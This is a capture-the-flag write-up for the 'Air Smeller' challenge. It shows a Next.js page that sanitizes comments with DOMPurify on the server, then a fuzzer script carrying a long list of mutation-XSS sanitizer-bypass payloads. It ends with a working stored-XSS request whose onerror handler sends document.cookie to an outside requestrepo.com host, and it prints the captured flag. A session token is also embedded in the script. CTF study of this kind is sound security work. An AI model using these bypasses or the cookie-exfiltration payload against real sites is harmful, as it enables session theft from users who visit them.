---
tags: 
references:
---
# Air Smeller
Solves: 
Tags: #dompurify #xss #fuzzer 
## Description
> I found this website were you can rate the smell of the air, after purification. Do you know a good purifier, maybe you can recommend some purifier to the people.
## Overview
It's a single page that shows some ratings and lets to submit one.
## Road to flag
The flag is in the bot's cookies. The bot refreshes the page every minute.
```js
browser.setCookie({
  domain: process.env.DOMAIN,
  httpOnly: false,
  expires: -1,
  name: "flag",
  value: process.env.FLAG,
  path: "/",
});

const page = await browser.newPage();

await page.goto(`http://${process.env.DOMAIN}`);

while (true) {
  console.log("Refreshing Website");
  await page.reload();

  // Reload once per minute
  await sleep(60000);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

```
## Code review
Dom Purify is used at serverside
```jsx
"use server";

import { getRatings } from "@/utils/ratings";
import { JSDOM } from "jsdom";
import DOMPurify from "dompurify";
import { Stars } from "./stars";

export const Ratings = async () => {
  const window = new JSDOM("").window;
  const purify = DOMPurify(window);

  return (
    <div>
      <div className="font-bold">
        What other people said about the smell of our purifier:
      </div>
      {(await getRatings()).map((r, i) => (
        <div key={i} className="flex bg-white p-2 flex-col">
          <div className="rounded-lg border p-2 w-full bg-blue-200">
            <Stars value={r.stars} />
            <div
              dangerouslySetInnerHTML={{ __html: purify.sanitize(r.comment) }}
            />
          </div>
          <div className="w-full flex">
            <div className="text-sm ml-auto self-start">{r.author}</div>
          </div>
        </div>
      ))}
    </div>
  );
};
```
## Exploitation

`fuzzer.js`
```js
const { JSDOM } = require("jsdom");

const URL = "http://sebb.local:3000";

function generateRandomHTML(codes) {
  const randomHTML = [];
  const length = Math.floor(Math.random() * 100) + 1;
  const payload = "//onerror=alert()";

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * codes.length);
    if (i === 0) randomHTML.push(codes[randomIndex].replace("{p}", payload));
    else
      randomHTML.push(
        codes[randomIndex].replace("{p}", randomHTML[randomHTML.length - 1])
      );
  }

  return randomHTML.join(" ");
}

function checkForUnusualAttributes(element) {
  try {
    const usualAttributes = [
      "alt",
      "src",
      "href",
      "class",
      "rel",
      "method",
      "action",
      "name",
      "type",
      "value",
      "formaction",
      "id",
      "is",
      "title",
      "style",
      "lang",
      "charset",
      "content",
      "data-precedence",
      "as",
      "fetchpriority",
      "async",
      "sizes",
      "nomodule",
      "xmlns",
      "width",
      "height",
      "viewBox",
      "fill",
      "stroke",
      "d",
      "stroke-width",
      "stroke-linecap",
      "stroke-linejoin",
      "for",
    ];
    const foundAttributes = new Set();
    const dom = new JSDOM(element);
    const document = dom.window.document;

    document.querySelectorAll("*").forEach((tag) => {
      Array.from(tag.attributes).forEach((attr) => {
        if (!usualAttributes.includes(attr.name))
          foundAttributes.add(attr.name);
      });
    });

    return Array.from(foundAttributes);
  } catch {}
}

async function startFuzzing() {
  const codes = [
    "<!doctype html>",
    "<a>{p}",
    "<a {p}>",
    '<a id="{p}"></a>',
    '<x title="{p}">',
    "<img {p}>",
    "<svg>{p}",
    "<math>{p}",
    "</math>",
    "<mglyph>{p}",
    "</mglyph>",
    "<mtext>{p}",
    "<filter>{p}",
    "<blockquote>{p}",
    "<mi>",
    "<image>{p}",
    "<desc>{p}",
    "<form>{p}",
    "<iframe {p}>",
    '<iframe srcdoc="{p}"></iframe>',
    "<!CDATA[[{p}]]>",
    "<style>{p}",
    "</style>",
    "</textarea>{p}",
    "<img src=x onerror=alert()>",
    "&lt;img src=x onerror=alert()&gt;",
    "<!--{p}",
    " -->",
    "<xmp>{p}",
    "</xmp>",
    "<noembed>{p}",
    "</noembed>",
    "<noframes>{p}",
    "<plaintext>{p}",
    "<noscript>{p}",
    "</noscript>",
    '<math><annotation-xml encoding="text/html"><style>{p}',
    '<math><annotation-xml encoding="{p}">',
    "<title>{p}",
    'is="{p}"',
    "<table>{p}",
    "<table><caption>{p}",
    '<isindex prompt="{p}">',
    "https://kqchc5l1.requestrepo.com/?{p}",
    "<p>{p}</p>",
    "<script>",
    "<script>{p}",
    "<a id=1><audio>{p}<altglyphdef><animatecolor><filter><fieldset>{p}<a id=2></fieldset></a>",
    "onload&#x3d;alert(1)",
    "//onerror//",
    "<portal>",
    "<portal {p}>",
    "</portal>",
    '<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">',
    "<![CDATA[<math><img src=x onerror=alert(1)>]]>",
    "<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>",
    "<noscript><style></noscript><img src=x onerror=alert(1)>",
    '<div><table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table></div>',
    '<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">.',
    "<svg><annotation-xml><foreignobject><style><!--</style><p id=\"--><img src='x' onerror='alert(1)'>\">",
    '<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">',
    '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
    "<math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”>",
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    '<!--a foo=--!>{p}<!--<a>">',
    "<![CDATA[<math>{p}]]>",
    "<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>",
    "<noscript><style></noscript>{p}",
    '<div><table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style>{p}"></a></style></svg></caption></table></div>',
    '<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="->{p}">.',
    '<svg><annotation-xml><foreignobject><style><!--</style><p id="-->{p}">',
    '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style>{p}">',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
    "<form><math><mtext></form><form><mglyph><style></math>{p}",
    '<svg></p><style><a id="</style>{p}">',
    "<?img ><img src onerror=alert(1)>?>",
    '<?xml-stylesheet > <img src=x onerror="alert(1)"> ?>',
    "<?img >{p}?>",
    "<?xml-stylesheet > {p} ?>",
  ];

  try {
    while (true) {
      const randomHTML = generateRandomHTML(codes);
      const response = await fetch(URL, {
        headers: {
          Cookie:
            "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiZWE0MTA3OTgtMDAwYy00NzgzLWI1ZWItYzQ5MGI0MGE4YzcyIiwicm9sZSI6Ik1FTUJFUiIsImhhc1Blcm0iOmZhbHNlLCJpYXQiOjE3NDMyNTE1NDUsImV4cCI6MTc0MzI1NTE0NX0.N2ujgXFMnmGTKFmg1brCVz1Dlzp0pWdi1f0i56Cyu_0; session=Ijk4NDIwMWNmLTEzMDAtMTFmMC05NTQ4LTkyNWZkNzhhZWQxOCI.-Fyt2CUQ35TiX_FHlLPbkSMw44E",
          Accept: "text/x-component",
          "Accept-Language": "en-US,en;q=0.5",
          "Next-Action": "40b1d94db29b7a01aa777e20aaf38a4bd722afcc6e",
          "Next-Router-State-Tree":
            "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
          "Content-Type": "text/plain;charset=UTF-8",
          "Sec-GPC": "1",
          Priority: "u=0",
        },
        referrer: "http://sebb.local:3000/",
        body: JSON.stringify([
          { comment: randomHTML, author: randomHTML, stars: 1 },
        ]),
        method: "POST",
      });

      const html = await (await fetch(URL)).text();

      const unusualAttributes = checkForUnusualAttributes(html);

      if (unusualAttributes.length > 0) {
        console.log("Generated HTML:", randomHTML);
        console.log("Unusual attributes found:", unusualAttributes);
        console.log("Rendered HTML:", html);
        if (
          unusualAttributes.includes("onerror") ||
          unusualAttributes.includes("script")
        ) {
          const fs = require("fs");
          fs.writeFileSync("payload.txt", randomHTML);
          break;
        }
      }
    }
  } catch (error) {
    console.error("An error occurred:", error.message);
  }
}

startFuzzing();

```

Came up with:
```
<svg></p> <style>&lt;img src=x onerror=alert('sas')&gt;<style>

<svg></p> <style>&lt;img src=x onerror="fetch('//sbf55cat.requestrepo.com/?c='+encodeURIComponent(document.cookie))"&gt;<style>
```
```
await fetch("https://i6ik8dc79fns8pmt.dyn.acsc.land/", {
    "credentials": "omit",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Accept": "text/x-component",
        "Accept-Language": "en-US,en;q=0.5",
        "Next-Action": "402e8a84b6ab3209ce0e2ff5e7940f0fe079895e65",
        "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
        "Content-Type": "text/plain;charset=UTF-8"
    },
    "referrer": "https://i6ik8dc79fns8pmt.dyn.acsc.land/",
		body: JSON.stringify([
          { comment: `<svg></p> <style>&lt;img src=x onerror="fetch('//sbf55cat.requestrepo.com/?c='+encodeURIComponent(document.cookie))"&gt;<style>`, author: "a", stars: 1 },
        ]),
    "method": "POST",
    "mode": "cors"
});
```

`dach2025{die_luft_ist_hier_so_reeeein_z8y9bunf9w44v43y}`